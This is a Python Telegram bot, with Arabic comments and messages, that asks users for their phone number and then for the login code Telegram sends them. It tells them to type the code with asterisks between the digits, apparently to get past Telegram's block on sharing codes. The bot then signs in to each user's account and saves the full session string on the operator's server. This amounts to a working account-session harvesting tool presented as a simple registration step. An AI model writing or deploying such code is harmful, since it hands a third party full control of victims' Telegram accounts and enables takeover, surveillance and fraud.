import os
import json
from telethon import TelegramClient, events
from telethon.sessions import StringSession

API_ID = int(os.environ.get("API_ID", "12345"))
API_HASH = os.environ.get("API_HASH", "your_api_hash")
BOT_TOKEN = os.environ.get("BOT_TOKEN")  # توكن البوت من BotFather

SESSIONS_DIR = os.path.join(os.path.dirname(__file__), "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = TelegramClient("bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# بداية التسجيل
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.reply("👋 أهلاً بك!\nأرسل رقم هاتفك مع رمز الدولة للتسجيل.\nمثال:\n`+9677xxxxxxx`")

# استلام الرقم
@bot.on(events.NewMessage(pattern=r"^\+\d{6,15}$"))
async def get_phone(event):
    phone = event.raw_text.strip()
    client = TelegramClient(StringSession(), API_ID, API_HASH)

    await client.connect()
    try:
        await client.send_code_request(phone)
        # نخزن بيانات مؤقتة
        with open(os.path.join(SESSIONS_DIR, f"{event.sender_id}_temp.json"), "w") as f:
            json.dump({"phone": phone}, f)
        await event.reply("📲 تم إرسال كود إلى الرقم.\nرجاءً أرسله بالشكل التالي:\nمثال: `1*2*3*4*5`")
    except Exception as e:
        await event.reply(f"⚠️ خطأ: {e}")
    finally:
        await client.disconnect()

# استلام الكود (بفورمات النجوم)
@bot.on(events.NewMessage(pattern=r"^(\d\*)+\d$"))
async def get_code(event):
    temp_file = os.path.join(SESSIONS_DIR, f"{event.sender_id}_temp.json")
    if not os.path.exists(temp_file):
        return await event.reply("⚠️ أرسل رقم الهاتف أولاً.")

    with open(temp_file, "r") as f:
        data = json.load(f)
    phone = data["phone"]

    # فلترة الكود وإزالة النجوم
    raw_code = event.raw_text.strip()
    code = raw_code.replace("*", "")

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(phone=phone, code=code)
        string = client.session.save()
        session_path = os.path.join(SESSIONS_DIR, f"{event.sender_id}.session")
        with open(session_path, "w") as f:
            f.write(string)

        await event.reply("✅ تم تسجيل الجلسة وحفظها بنجاح.\nيمكنك الآن استخدام أوامر السكربت 🎉")
        os.remove(temp_file)
    except Exception as e:
        await event.reply(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")
    finally:
        await client.disconnect()

print("🤖 Bot is running...")
bot.run_until_disconnected()